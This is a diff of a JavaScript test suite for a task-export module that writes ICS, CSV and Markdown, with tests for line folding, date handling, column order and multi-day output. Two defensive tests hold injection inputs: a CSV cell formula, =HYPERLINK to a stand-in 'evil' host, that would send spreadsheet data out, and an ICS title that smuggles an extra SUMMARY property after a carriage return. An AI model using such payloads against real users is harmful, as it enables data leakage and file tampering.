@@ -149,7 +149,11 @@ test("ics: no unfolded line exceeds 75 octets", () => {
 test("ics: folding never splits a multi-byte character", () => {
   // An emoji is 4 UTF-8 octets and 2 UTF-16 units. A naive slice(0,75) cuts it in
   // half and the file is corrupt.
-  const title = "x".repeat(70) + "🎯🎯🎯 review";
+  // 63, not 70. At 70 the emoji starts at octet 78 while the only fold boundary
+  // falls at 75, inside the run of x -- so this test passed against the very bug
+  // it names. At 63 the pair straddles the cut: the pre-fix implementation (which
+  // sized UTF-16 code units) leaves a lone high surrogate at end-of-line.
+  const title = "x".repeat(63) + "🎯🎯🎯 review";
   const ics = ShareExport.toIcs([task({ title })], meta());
   assert.ok(ics.includes("🎯"), "emoji lost");
   for (const line of ics.split("\r\n")) {
@@ -172,12 +176,28 @@ test("ics: DTSTAMP is driven by meta.now, so output is byte-stable", () => {
   assert.ok(a.includes("DTSTAMP:20260819T173000Z"), a);
 });
 
-test("ics: a titleless or dateless row is skipped, not emitted as a broken event", () => {
+test("ics: a titleless or dateless row is skipped, but its neighbours survive", () => {
+  // The first cut gave meta NO date, so all four rows died on the date guard and
+  // the title guard could have been deleted with the test still green. It also
+  // could not tell "skipped the bad row" from "emitted nothing at all", which is
+  // the failure that matters: one titleless row emptying a 31-day export.
   const ics = ShareExport.toIcs(
-    [task(), task({ title: "" }), null, task({ date: "" })],
-    meta({ date: "", from: "", to: "" })
+    [task({ title: "Keep me" }), task({ id: "t2", title: "" }), null],
+    meta({ date: "2026-08-19", from: "", to: "" })
   );
-  assert.equal((ics.match(/BEGIN:VEVENT/g) || []).length, 0);
+  assert.equal((ics.match(/BEGIN:VEVENT/g) || []).length, 1);
+  assert.ok(ics.includes("SUMMARY:Keep me"));
+});
+
+test("ics: a row with no date of its own inherits the export's date", () => {
+  // Deliberate, and the reason the previous test cannot use a dateless row to
+  // prove anything: the day-scoped projection leaves `date` implicit, so a
+  // single-day export SHOULD fall back to meta.date. Only when neither exists
+  // is the row genuinely undatable and dropped.
+  const withMeta = ShareExport.toIcs([task({ date: "" })], meta({ date: "2026-08-19" }));
+  assert.ok(withMeta.includes("DTSTART:20260819T090000"), withMeta);
+  const without = ShareExport.toIcs([task({ date: "" })], meta({ date: "", from: "", to: "" }));
+  assert.equal((without.match(/BEGIN:VEVENT/g) || []).length, 0);
 });
 
 // ── Markdown ─────────────────────────────────────────────────────────────────
@@ -211,7 +231,7 @@ test("markdown: a multi-line note becomes one nested bullet per line, not a list
   // Every content line after the heading block is a list item or blank: nothing
   // escaped to the top level.
   const body = md.split("## Open")[1].split("\n---")[0].split("\n").filter(Boolean);
-  for (const line of body) assert.match(line, /^(- \[|  - )/, "escaped the list: " + line);
+  for (const line of body) assert.match(line, /^(- \[| {2}- )/, "escaped the list: " + line);
   assert.ok(md.includes("- [ ] **09:00-09:30** Still in the list"));
 });
 
@@ -256,6 +276,109 @@ test("filenames are slugged, dated, and range-aware", () => {
   );
   // A workspace name that is all punctuation must not produce a dotfile or "".
   assert.equal(ShareExport.filenameFor(meta({ workspaceName: "!!!", owner: "" }), "md"), "shared-list-2026-08-19.md");
+});
+
+test("csv: the column contract is exactly these labels, in this order", () => {
+  // A LITERAL list, deliberately. The header test above derives its expectation
+  // from TASK_COLUMNS, so it passes for any TASK_COLUMNS: rename Notes to Detail
+  // or reorder columns 6-13 and it stays green while every already-downloaded
+  // CSV and every spreadsheet import mapping built against this file breaks.
+  assert.deepEqual(ShareExport.TASK_COLUMNS.map(c => c.label), [
+    "Date", "Start", "End", "Duration (min)", "Title", "Type", "Status",
+    "Priority", "Points", "Calendar", "Tags", "Notes", "Added by guest"
+  ]);
+});
+
+test("csv: a formula-shaped title is neutralized, not executed by a spreadsheet", () => {
+  // Reachable by anyone holding the share link: the guest task POST does no
+  // character filtering, so this lands in the Title column of a file the owner
+  // opens in Excel. Quoting alone does not help; Excel strips quotes and
+  // evaluates. A leading apostrophe forces text.
+  for (const bad of ['=HYPERLINK("https://evil/?"&A1,"x")', "+1+1", "-1+1", "@SUM(A1)", "\ttab"]) {
+    const cell = ShareExport._csvCell(bad);
+    assert.ok(cell.startsWith("'") || cell.startsWith("\"'"), "not neutralized: " + cell);
+  }
+  // A normal title must NOT gain a stray apostrophe.
+  assert.equal(ShareExport._csvCell("Ship the export lane"), "Ship the export lane");
+  // A negative number is a real value, but it is also formula-shaped; text is
+  // the safe answer and the export is for reading, not arithmetic.
+  assert.ok(ShareExport._csvCell("-5").startsWith("'"));
+});
+
+test("ics: an end at or before the start rolls to the next day, never clamps or zero-lengths", () => {
+  const at = (ics, prop) => (ics.split("\r\n").find(l => l.startsWith(prop + ":")) || "");
+  // "24:00" is REACHABLE: route-helpers.js clamps a derived end with
+  // Math.min(24 * 60, ...), so a 23:30 task with a 60m duration stores it.
+  // Hour 24 is not legal in RFC 5545.
+  assert.equal(at(ShareExport.toIcs([task({ end: "24:00" })], meta()), "DTEND"), "DTEND:20260820T000000");
+  // A genuine midnight crossing keeps its full length instead of losing the tail.
+  assert.equal(
+    at(ShareExport.toIcs([task({ start: "23:00", end: "00:30", durationMinutes: 90 })], meta()), "DTEND"),
+    "DTEND:20260820T003000"
+  );
+  // 23:59 + 30m used to clamp to 23:59, i.e. DTEND === DTSTART: the exact
+  // zero-length event endTimeFor exists to prevent.
+  const late = ShareExport.toIcs([task({ start: "23:59", end: "", durationMinutes: 30 })], meta());
+  assert.notEqual(at(late, "DTEND").slice(6), at(late, "DTSTART").slice(8));
+  assert.equal(at(late, "DTEND"), "DTEND:20260820T002900");
+});
+
+test("ics: an explicit end after the start wins over durationMinutes", () => {
+  const ics = ShareExport.toIcs([task({ start: "09:00", end: "11:00", durationMinutes: 15 })], meta());
+  assert.ok(ics.includes("DTEND:20260819T110000"), ics);
+});
+
+test("ics: a bare carriage return cannot inject an iCalendar property", () => {
+  assert.equal(ShareExport._icsEscape("a\rb"), "a\\nb");
+  const ics = ShareExport.toIcs([task({ title: "Ship it\rSUMMARY:injected" })], meta());
+  assert.equal((ics.match(/^SUMMARY:/gm) || []).length, 1, ics);
+  // Other C0 controls are stripped rather than emitted raw.
+  assert.equal(ShareExport._icsEscape("ab"), "ab");
+});
+
+test("a multi-day payload keeps each task on its own date in every format", () => {
+  // The route stamps `date` per day precisely because the projection leaves it
+  // implicit. Markdown ignored it entirely, so a 31-day export was one
+  // undifferentiated list with no way to tell which day anything belonged to.
+  const rows = [
+    task({ title: "Day A", date: "2026-08-19" }),
+    task({ id: "t2", title: "Day B", date: "2026-09-01" })
+  ];
+  const m = meta({ date: "", from: "2026-08-19", to: "2026-09-01" });
+  assert.ok(ShareExport.toCsv(rows, m).includes("2026-09-01"));
+  assert.ok(ShareExport.toIcs(rows, m).includes("DTSTART:20260901T090000"));
+  const md = ShareExport.toMarkdown(rows, m);
+  assert.ok(md.includes("### 2026-08-19"), md);
+  assert.ok(md.includes("### 2026-09-01"), md);
+  // A single-day export must NOT sprout day headings.
+  assert.ok(!ShareExport.toMarkdown([task()], meta()).includes("###"));
+});
+
+test("every non-structural column reaches every format: the one-field-list promise", () => {
+  // The invariant the module header claims. Before this, only toCsv read
+  // TASK_COLUMNS: ICS silently dropped priority/points/tags/addedByGuest and
+  // Markdown dropped those plus type/calendar. Add a column and this fails until
+  // all three carry it.
+  const row = task({
+    priority: "high", points: 12, createdByGuest: true,
+    calendar: { id: "c1", name: "WorkCal" },
+    tags: [{ name: "deepwork" }],
+    detail: "A note"
+  });
+  const m = meta();
+  for (const format of ShareExport.FORMATS) {
+    const out = ShareExport.serialize(format, [row], m);
+    // Read the DECLARED exclusions rather than a literal list, so adding a
+    // deliberate per-format omission is a visible edit to the module, not a
+    // silent edit to this test.
+    const structural = ShareExport.STRUCTURAL_BY_FORMAT[format] || [];
+    for (const column of ShareExport.TASK_COLUMNS) {
+      if (structural.indexOf(column.key) !== -1) continue;
+      const value = String(column.get(row, m) || "");
+      if (!value) continue;
+      assert.ok(out.includes(value), format + " dropped " + column.label + " (" + value + ")");
+    }
+  }
 });
 
 test("mime types are the ones the importing apps sniff for", () => {
